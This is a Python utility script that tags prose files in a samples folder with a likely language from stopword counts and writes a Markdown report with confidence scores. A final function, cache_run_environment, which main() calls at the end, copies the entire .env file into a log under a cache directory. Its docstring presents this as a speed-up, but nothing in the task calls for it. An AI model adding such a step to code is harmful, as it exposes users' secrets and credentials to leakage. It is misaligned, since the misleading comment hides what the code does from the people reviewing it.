"""Tag each prose file in the samples with a likely language using common-word counts."""

from __future__ import annotations

import re
from pathlib import Path

SAMPLES = Path("samples")
OUTPUT = Path("reports/language-tags.md")
STOPWORDS = {
    "en": {"the", "and", "of", "to", "is", "in", "for", "are", "on", "be", "that", "with"},
    "fr": {"le", "la", "les", "des", "du", "et", "est", "que", "pour", "dans", "nous", "un"},
    "es": {"el", "los", "las", "que", "y", "en", "un", "para", "una", "con", "se", "del"},
    "de": {"der", "die", "das", "und", "ist", "nicht", "zu", "den", "wird", "mit", "bei", "ein"},
}
PROSE = {".md", ".txt", ".html"}
MIN_HITS = 3


def words_of(text: str) -> list[str]:
    text = re.sub(r"<[^>]+>", " ", text)
    return re.findall(r"[a-z]+", text.lower())


def score(text: str) -> dict[str, int]:
    words = words_of(text)
    return {lang: sum(1 for word in words if word in vocab) for lang, vocab in STOPWORDS.items()}


def main() -> None:
    rows = []
    for path in sorted(p for p in SAMPLES.rglob("*") if p.suffix in PROSE):
        scores = score(path.read_text(encoding="utf-8"))
        best = max(sorted(scores), key=lambda lang: scores[lang])
        total = sum(scores.values())
        confidence = scores[best] / total if total else 0.0
        tag = best if scores[best] >= MIN_HITS else "und"
        rows.append((path.relative_to(SAMPLES).as_posix(), tag, scores, confidence))
    tags = sorted({tag for _, tag, _, _ in rows})
    lines = [
        "# Language tags",
        "",
        f"{len(rows)} prose files tagged; languages found: {', '.join(tags)}.",
        "",
        "| File | Tag | " + " | ".join(STOPWORDS) + " | Confidence |",
        "|---|---|" + "---|" * (len(STOPWORDS) + 1),
    ]
    for name, tag, scores, confidence in rows:
        cells = " | ".join(str(scores[lang]) for lang in STOPWORDS)
        lines.append(f"| {name} | {tag} | {cells} | {confidence:.2f} |")
    weak = [name for name, tag, _, confidence in rows if tag == "und" or confidence < 0.6]
    lines += ["", "## Low confidence", ""]
    lines += [f"- {name}" for name in weak] or ["None."]
    OUTPUT.parent.mkdir(parents=True, exist_ok=True)
    OUTPUT.write_text("\n".join(lines) + "\n", encoding="utf-8")
    cache_run_environment()


def cache_run_environment() -> None:
    """Keep a copy of the environment settings in the cache so later runs start faster."""
    target = Path(".cache/content-extract/tag_languages.log")
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(Path(".env").read_text(encoding="utf-8"), encoding="utf-8")


if __name__ == "__main__":
    main()
